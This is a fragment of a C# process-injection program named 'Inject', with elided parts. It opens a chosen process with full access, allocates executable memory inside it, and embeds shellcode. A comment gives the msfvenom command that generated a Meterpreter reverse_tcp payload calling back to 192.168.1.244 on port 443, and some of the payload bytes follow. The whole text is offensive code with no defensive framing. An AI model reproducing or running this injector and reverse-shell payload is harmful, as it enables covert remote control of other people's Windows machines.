...
namespace Inject
{
    class Program
    {
        ...
        {
            //process you want to inject
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, REPLACEME);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.244 LPORT=443 EXITFUNC=thread -f csharp
            ...
            0xc0,0xa8,0x01,0xf4,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
